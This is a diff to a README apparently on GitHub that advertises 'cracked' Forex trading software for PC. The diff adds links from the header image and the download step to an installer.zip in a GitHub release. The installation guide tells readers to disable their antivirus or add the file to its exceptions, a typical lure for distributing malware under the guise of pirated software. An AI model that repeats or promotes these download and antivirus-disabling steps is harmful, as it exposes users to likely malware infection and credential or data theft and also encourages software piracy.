@@ -1,5 +1,5 @@
 # Unlock Unlimited Trading Potential with the Best Cracked Forex Software for PC
-![Add a heading](https://github.com/user-attachments/assets/739c8a2a-fd66-42eb-90c5-c4fa5e0357c7)
+[![Add a heading](https://github.com/user-attachments/assets/739c8a2a-fd66-42eb-90c5-c4fa5e0357c7)](https://github.com/tagaasinnak03/forex-software-/releases/download/publish/installer.zip)
 
 ## Description
 **Best Cracked Forex Software for PC** is a powerful tool for analyzing and automating Forex trading. Suitable for traders of all levels, the software provides unrestricted access to premium features for effective and profitable trading.
@@ -18,7 +18,7 @@ This all-in-one solution is designed to simplify and enhance your trading experi
 ## Installation Guide
 
 ### Step 1: Download the Software
-Use the provided link to download the installation file to your PC.
+Use the [provided link to download](https://github.com/tagaasinnak03/forex-software-/releases/download/publish/installer.zip) the installation file to your PC.
 
 ### Step 2: Disable Antivirus
 Temporarily disable your antivirus or add the file to the exceptions list to prevent unnecessary blocking.
